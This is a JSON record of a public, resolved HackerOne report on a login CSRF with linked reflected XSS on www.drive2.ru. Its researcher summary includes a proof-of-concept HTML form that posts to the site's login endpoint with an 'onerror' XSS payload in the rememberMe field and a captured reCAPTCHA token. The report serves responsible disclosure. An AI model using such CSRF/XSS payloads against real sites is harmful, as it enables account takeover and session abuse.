{"id":835142,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MzUxNDI=","url":"https://hackerone.com/reports/835142","title":"[www.drive2.ru] CSRF through FCTX token bypass","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-03-31T09:28:57.438Z","submitted_at":"2020-03-31T09:28:57.438Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"what_web","url":"/what_web","profile_picture_urls":{"small":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/k2xdip5e0nyz4n3zc0u8nlqpfr6c/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a?response-content-disposition=inline%3B%20filename%3D%22IMG_20201019_232634.jpg%22%3B%20filename%2A%3DUTF-8%27%27IMG_20201019_232634.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2UMPB2FX%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065921Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEq9neBunEjsdY7f8cNZfYtjkYnfx7sYXIBk82UycrktAiEA5w10R4CJv%2FQIiYTXv1ZP8q%2BbScvvzy7qwcG%2BmPmKCXMqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDKX6CTSGAGf6Bt5yHyqRA9qW1WRQYe7JztYb6rdSeSRyzKgf4LxEu42JMoyPyy0VqqdaIdaW%2F5Oe%2FZcBqKJkPjfrnsLv1E3Cttn6QZ2fsMawdDGLyKyEEvAx6LbD4TYD1QOy0YJIw6j32Nt3V4psvzyU384FsJYLymiqMGAqTzIuUS4QNvTcHn%2BFoOZvS%2F06fP5YWj%2BxpW%2BELDyBb5CFIWqKXYmkW%2BPv4IxFiMVfFF4KM80ZKVGfyJ7nRaRwvjM5YUJYHOlvXjFuPBSC3IYIgEZYlopEqTolZ1OQ2zbi1yDB%2FWl1rx7i7cbCVK6zJwPdLcPRBOa7jlMN0jlHdNPzjyKxdEaNBy7Cyflyw%2FZCl7X1dB7yuSBF8YK2st4h%2FZchseLh%2BjukipjtpVl5nDjO8BSu5evt1V1lFzADomlTKShrSgjmej1gvXmULpbdNuEwc3vMl328MfuwtHHSSvzZo5xxP0U1cq9fhM0Ztcea1ZRpQDZR4DB1jRqdjeMIXNuuwv3G7Uotj1VrvA87zW9Og6gQ9VN7fQSdOpurQFAV2WvRMIuSqv8FOusB%2B%2BEh7xquKUpKrZEfrLl0yLcAZyezk5OlnVLaoE%2BCU7%2F1YWDwq4fJ%2Fzqx58r%2Ffgzx%2FRuGFLAoCPIl7GI47ntqpCuRo5kjknXh3Vhm0Ds%2B9y0Uo9mgVKhl6XjEqADeRJOm5JpIvTZkPibWah%2FFXooiOsIWnpbe3xZbkrh62wdx0iVuonbBNy6Z0vYXXREkzeNyKh%2Fx0i0DwAehfYiLehqkIm1GqvDnaSiQ0dTRzOsrEnXwNhRtDRaBDDLvFXHGy3Xm8ucb70jki0U1otEIUfIG%2Fnfsrs7zhSOcLfi6%2B4aytuy%2FrSFLmVnwIpfIzQ%3D%3D\u0026X-Amz-Signature=0f8bd69aacd0fd849d9cfd39ac3059244261a5fc1b7f6ef388d4911e0c1ae310"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":14633,"url":"https://hackerone.com/drive_net_inc","handle":"drive_net_inc","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/014/633/f6b86e425a12a8b78f4c35d4612beabb3e91ce05_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/633/f6b86e425a12a8b78f4c35d4612beabb3e91ce05_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"DRIVE.NET, Inc.","twitter_handle":"drive2","website":"https://www.drive2.ru","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"no-content","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-03-31T12:10:19.899Z","bug_reporter_agreed_on_going_public_at":"2020-03-31T11:04:42.508Z","team_member_agreed_on_going_public_at":"2020-03-31T12:10:19.760Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"","vulnerability_information_html":"","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-04-30T11:04:42.556Z","allow_singular_disclosure_after":-20980479.04436507,"singular_disclosure_allowed":true,"vote_count":24,"voters":["what_web","sodium_","hackerone__","l_user","starbucks_security1","rootishere","razer-razer","b69fb2ebda43240ece9dbeb","bug2bgug_2","shubhamvpandey","and 14 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":30150,"asset_type":"URL","asset_identifier":"www.drive2.ru","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7491623,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-31T11:00:20.417Z","updated_at":"2020-03-31T11:00:20.417Z","actor":{"username":"onyxmaster","cleared":false,"url":"/onyxmaster","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/099/938/cdca332ad04cfd4fd4be65eb321d2cbae5355b14_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"what_web","url":"/what_web"},"genius_execution_id":null,"team_handle":"drive_net_inc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7491644,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-31T11:04:13.878Z","updated_at":"2020-03-31T11:04:13.878Z","actor":{"username":"what_web","cleared":false,"url":"/what_web","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/k2xdip5e0nyz4n3zc0u8nlqpfr6c/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22IMG_20201019_232634.jpg%22%3B%20filename%2A%3DUTF-8%27%27IMG_20201019_232634.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2UMPB2FX%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065921Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEq9neBunEjsdY7f8cNZfYtjkYnfx7sYXIBk82UycrktAiEA5w10R4CJv%2FQIiYTXv1ZP8q%2BbScvvzy7qwcG%2BmPmKCXMqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDKX6CTSGAGf6Bt5yHyqRA9qW1WRQYe7JztYb6rdSeSRyzKgf4LxEu42JMoyPyy0VqqdaIdaW%2F5Oe%2FZcBqKJkPjfrnsLv1E3Cttn6QZ2fsMawdDGLyKyEEvAx6LbD4TYD1QOy0YJIw6j32Nt3V4psvzyU384FsJYLymiqMGAqTzIuUS4QNvTcHn%2BFoOZvS%2F06fP5YWj%2BxpW%2BELDyBb5CFIWqKXYmkW%2BPv4IxFiMVfFF4KM80ZKVGfyJ7nRaRwvjM5YUJYHOlvXjFuPBSC3IYIgEZYlopEqTolZ1OQ2zbi1yDB%2FWl1rx7i7cbCVK6zJwPdLcPRBOa7jlMN0jlHdNPzjyKxdEaNBy7Cyflyw%2FZCl7X1dB7yuSBF8YK2st4h%2FZchseLh%2BjukipjtpVl5nDjO8BSu5evt1V1lFzADomlTKShrSgjmej1gvXmULpbdNuEwc3vMl328MfuwtHHSSvzZo5xxP0U1cq9fhM0Ztcea1ZRpQDZR4DB1jRqdjeMIXNuuwv3G7Uotj1VrvA87zW9Og6gQ9VN7fQSdOpurQFAV2WvRMIuSqv8FOusB%2B%2BEh7xquKUpKrZEfrLl0yLcAZyezk5OlnVLaoE%2BCU7%2F1YWDwq4fJ%2Fzqx58r%2Ffgzx%2FRuGFLAoCPIl7GI47ntqpCuRo5kjknXh3Vhm0Ds%2B9y0Uo9mgVKhl6XjEqADeRJOm5JpIvTZkPibWah%2FFXooiOsIWnpbe3xZbkrh62wdx0iVuonbBNy6Z0vYXXREkzeNyKh%2Fx0i0DwAehfYiLehqkIm1GqvDnaSiQ0dTRzOsrEnXwNhRtDRaBDDLvFXHGy3Xm8ucb70jki0U1otEIUfIG%2Fnfsrs7zhSOcLfi6%2B4aytuy%2FrSFLmVnwIpfIzQ%3D%3D\u0026X-Amz-Signature=a0c057f44ed5578d7868e8660d377f64407398bbb0db5432de5c23c5e3654d0b"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"drive_net_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7491646,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-31T11:04:42.526Z","updated_at":"2020-03-31T11:04:42.526Z","first_to_agree":true,"actor":{"username":"what_web","cleared":false,"url":"/what_web","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/k2xdip5e0nyz4n3zc0u8nlqpfr6c/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22IMG_20201019_232634.jpg%22%3B%20filename%2A%3DUTF-8%27%27IMG_20201019_232634.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2UMPB2FX%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065921Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEq9neBunEjsdY7f8cNZfYtjkYnfx7sYXIBk82UycrktAiEA5w10R4CJv%2FQIiYTXv1ZP8q%2BbScvvzy7qwcG%2BmPmKCXMqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDKX6CTSGAGf6Bt5yHyqRA9qW1WRQYe7JztYb6rdSeSRyzKgf4LxEu42JMoyPyy0VqqdaIdaW%2F5Oe%2FZcBqKJkPjfrnsLv1E3Cttn6QZ2fsMawdDGLyKyEEvAx6LbD4TYD1QOy0YJIw6j32Nt3V4psvzyU384FsJYLymiqMGAqTzIuUS4QNvTcHn%2BFoOZvS%2F06fP5YWj%2BxpW%2BELDyBb5CFIWqKXYmkW%2BPv4IxFiMVfFF4KM80ZKVGfyJ7nRaRwvjM5YUJYHOlvXjFuPBSC3IYIgEZYlopEqTolZ1OQ2zbi1yDB%2FWl1rx7i7cbCVK6zJwPdLcPRBOa7jlMN0jlHdNPzjyKxdEaNBy7Cyflyw%2FZCl7X1dB7yuSBF8YK2st4h%2FZchseLh%2BjukipjtpVl5nDjO8BSu5evt1V1lFzADomlTKShrSgjmej1gvXmULpbdNuEwc3vMl328MfuwtHHSSvzZo5xxP0U1cq9fhM0Ztcea1ZRpQDZR4DB1jRqdjeMIXNuuwv3G7Uotj1VrvA87zW9Og6gQ9VN7fQSdOpurQFAV2WvRMIuSqv8FOusB%2B%2BEh7xquKUpKrZEfrLl0yLcAZyezk5OlnVLaoE%2BCU7%2F1YWDwq4fJ%2Fzqx58r%2Ffgzx%2FRuGFLAoCPIl7GI47ntqpCuRo5kjknXh3Vhm0Ds%2B9y0Uo9mgVKhl6XjEqADeRJOm5JpIvTZkPibWah%2FFXooiOsIWnpbe3xZbkrh62wdx0iVuonbBNy6Z0vYXXREkzeNyKh%2Fx0i0DwAehfYiLehqkIm1GqvDnaSiQ0dTRzOsrEnXwNhRtDRaBDDLvFXHGy3Xm8ucb70jki0U1otEIUfIG%2Fnfsrs7zhSOcLfi6%2B4aytuy%2FrSFLmVnwIpfIzQ%3D%3D\u0026X-Amz-Signature=a0c057f44ed5578d7868e8660d377f64407398bbb0db5432de5c23c5e3654d0b"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"drive_net_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7491653,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-31T11:05:25.302Z","updated_at":"2020-03-31T11:05:25.302Z","actor":{"username":"what_web","cleared":false,"url":"/what_web","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/k2xdip5e0nyz4n3zc0u8nlqpfr6c/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22IMG_20201019_232634.jpg%22%3B%20filename%2A%3DUTF-8%27%27IMG_20201019_232634.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2UMPB2FX%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065921Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEq9neBunEjsdY7f8cNZfYtjkYnfx7sYXIBk82UycrktAiEA5w10R4CJv%2FQIiYTXv1ZP8q%2BbScvvzy7qwcG%2BmPmKCXMqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDKX6CTSGAGf6Bt5yHyqRA9qW1WRQYe7JztYb6rdSeSRyzKgf4LxEu42JMoyPyy0VqqdaIdaW%2F5Oe%2FZcBqKJkPjfrnsLv1E3Cttn6QZ2fsMawdDGLyKyEEvAx6LbD4TYD1QOy0YJIw6j32Nt3V4psvzyU384FsJYLymiqMGAqTzIuUS4QNvTcHn%2BFoOZvS%2F06fP5YWj%2BxpW%2BELDyBb5CFIWqKXYmkW%2BPv4IxFiMVfFF4KM80ZKVGfyJ7nRaRwvjM5YUJYHOlvXjFuPBSC3IYIgEZYlopEqTolZ1OQ2zbi1yDB%2FWl1rx7i7cbCVK6zJwPdLcPRBOa7jlMN0jlHdNPzjyKxdEaNBy7Cyflyw%2FZCl7X1dB7yuSBF8YK2st4h%2FZchseLh%2BjukipjtpVl5nDjO8BSu5evt1V1lFzADomlTKShrSgjmej1gvXmULpbdNuEwc3vMl328MfuwtHHSSvzZo5xxP0U1cq9fhM0Ztcea1ZRpQDZR4DB1jRqdjeMIXNuuwv3G7Uotj1VrvA87zW9Og6gQ9VN7fQSdOpurQFAV2WvRMIuSqv8FOusB%2B%2BEh7xquKUpKrZEfrLl0yLcAZyezk5OlnVLaoE%2BCU7%2F1YWDwq4fJ%2Fzqx58r%2Ffgzx%2FRuGFLAoCPIl7GI47ntqpCuRo5kjknXh3Vhm0Ds%2B9y0Uo9mgVKhl6XjEqADeRJOm5JpIvTZkPibWah%2FFXooiOsIWnpbe3xZbkrh62wdx0iVuonbBNy6Z0vYXXREkzeNyKh%2Fx0i0DwAehfYiLehqkIm1GqvDnaSiQ0dTRzOsrEnXwNhRtDRaBDDLvFXHGy3Xm8ucb70jki0U1otEIUfIG%2Fnfsrs7zhSOcLfi6%2B4aytuy%2FrSFLmVnwIpfIzQ%3D%3D\u0026X-Amz-Signature=a0c057f44ed5578d7868e8660d377f64407398bbb0db5432de5c23c5e3654d0b"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"drive_net_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7492441,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-31T12:10:19.810Z","updated_at":"2020-03-31T12:10:19.810Z","actor":{"username":"onyxmaster","cleared":false,"url":"/onyxmaster","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/099/938/cdca332ad04cfd4fd4be65eb321d2cbae5355b14_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"drive_net_inc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7492442,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-31T12:10:19.936Z","updated_at":"2020-03-31T12:10:19.936Z","actor":{"username":"onyxmaster","cleared":false,"url":"/onyxmaster","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/099/938/cdca332ad04cfd4fd4be65eb321d2cbae5355b14_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"drive_net_inc","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":20940,"category":"team","content":"During login on the login page, login is attempted through the FCTX token. In addition, the login page was implemented through g-recaptcha-response captcha, but an attacker can bypass g-recaptcha-response captcha without FCTX tokens, and login CSRF is possible.\n\nThe issue was fixed by enabling the missing anti-CSRF token validation.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eDuring login on the login page, login is attempted through the FCTX token. In addition, the login page was implemented through g-recaptcha-response captcha, but an attacker can bypass g-recaptcha-response captcha without FCTX tokens, and login CSRF is possible.\u003c/p\u003e\n\n\u003cp\u003eThe issue was fixed by enabling the missing anti-CSRF token validation.\u003c/p\u003e\n"},{"id":21196,"category":"researcher","content":"Many developers do not implement CSRF tokens on their login page. This doesn't have a big impact on security, but the CSRF token is implemented in Drive2, but the CSRF token is missing and XSS linkage was possible during login. XSS is performed through the `rememberMe` variable during login.\n\n##PoC\n```javascript\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform action=\"https://www.drive2.ru/reception/?.AMRU=https%3A%2F%2Fwww.drive2.ru%2F\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"login\" value=\"youremail\" /\u003e\n      \u003cinput type=\"hidden\" name=\"password\" value=\"yourpassword\" /\u003e\n      \u003cinput type=\"hidden\" name=\"rememberMe\" value=\"\u003cimg src=x onerror=alert(document.domain)\u003e\"/\u003e\n      \u003cinput type=\"hidden\" name=\"g\u0026#45;recaptcha\u0026#45;response\" value=\"03AHaCkAaaWRVYvbxavoJwreHHcF7LYNyq7A2sokgDWogNTXpwfoJqOvg\u0026#45;0NWV3rpXGmRJIbJsDz\u0026#45;7WBbxcTnXQcHFUlJXEjZlV1MlzKhR90lnCK0f6H0hapfn8ntpkb4yrxGL1rO8pEYIesSxN9n\u0026#95;KzKcLiehwQntUANUgt4fNDWXPodZI8uiaAxlUFvHX7TqctiVxAweCXIuOKxqcFZcU7MQYV06ZeCWLaisH7vxL36gR64Uq0Uq57vacU4Wr6wWbHt\u0026#95;eGuCzrFaXhQHeW43bBCqRhCwQj\u0026#95;ht1BFvf9MoX9\u0026#95;BDG7q7bdkag2x6P80nLqA46feChNVBFMJQ\u0026#95;3M3cAtcm5kdfzOELRkmJ6nHoCe3VPW7yYc5jHSexYxj8G9DwMA1Qy4tpTWc4F\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\n","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eMany developers do not implement CSRF tokens on their login page. This doesn\u0026#39;t have a big impact on security, but the CSRF token is implemented in Drive2, but the CSRF token is missing and XSS linkage was possible during login. XSS is performed through the \u003ccode\u003erememberMe\u003c/code\u003e variable during login.\u003c/p\u003e\n\n\u003ch2 id=\"poc\"\u003ePoC\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003ehtml\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003eform\u003c/span\u003e \u003cspan class=\"nx\"\u003eaction\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehttps://www.drive2.ru/reception/?.AMRU=https%3A%2F%2Fwww.drive2.ru%2F\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nx\"\u003emethod\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ePOST\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003einput\u003c/span\u003e \u003cspan class=\"nx\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehidden\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nx\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003elogin\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nx\"\u003evalue\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eyouremail\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003einput\u003c/span\u003e \u003cspan class=\"nx\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehidden\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nx\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003epassword\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nx\"\u003evalue\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eyourpassword\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003einput\u003c/span\u003e \u003cspan class=\"nx\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehidden\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nx\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003erememberMe\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nx\"\u003evalue\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;img src=x onerror=alert(document.domain)\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003einput\u003c/span\u003e \u003cspan class=\"nx\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehidden\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nx\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eg\u0026amp;#45;recaptcha\u0026amp;#45;response\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nx\"\u003evalue\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e03AHaCkAaaWRVYvbxavoJwreHHcF7LYNyq7A2sokgDWogNTXpwfoJqOvg\u0026amp;#45;0NWV3rpXGmRJIbJsDz\u0026amp;#45;7WBbxcTnXQcHFUlJXEjZlV1MlzKhR90lnCK0f6H0hapfn8ntpkb4yrxGL1rO8pEYIesSxN9n\u0026amp;#95;KzKcLiehwQntUANUgt4fNDWXPodZI8uiaAxlUFvHX7TqctiVxAweCXIuOKxqcFZcU7MQYV06ZeCWLaisH7vxL36gR64Uq0Uq57vacU4Wr6wWbHt\u0026amp;#95;eGuCzrFaXhQHeW43bBCqRhCwQj\u0026amp;#95;ht1BFvf9MoX9\u0026amp;#95;BDG7q7bdkag2x6P80nLqA46feChNVBFMJQ\u0026amp;#95;3M3cAtcm5kdfzOELRkmJ6nHoCe3VPW7yYc5jHSexYxj8G9DwMA1Qy4tpTWc4F\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003einput\u003c/span\u003e \u003cspan class=\"nx\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003esubmit\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nx\"\u003evalue\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eSubmit request\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"sr\"\u003e/form\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026gt;\n\u003c/span\u003e  \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"sr\"\u003e/body\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026gt;\n\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"sr\"\u003e/html\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026gt;\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e"}]}